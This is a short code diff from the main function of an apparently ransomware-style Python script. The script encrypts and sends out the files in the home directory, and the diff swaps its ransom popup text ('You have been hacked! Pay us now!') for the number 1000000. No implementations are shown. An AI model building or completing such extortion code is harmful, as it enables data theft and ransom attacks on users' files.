@@ -138,7 +138,7 @@ def main():
         key = key.read()
 
     encrypt_and_send_all_files(home, key)
-    display_popup("You have been hacked! Pay us now!")
+    display_popup(1000000)
     decrypt_all_files(home, key)
 
 
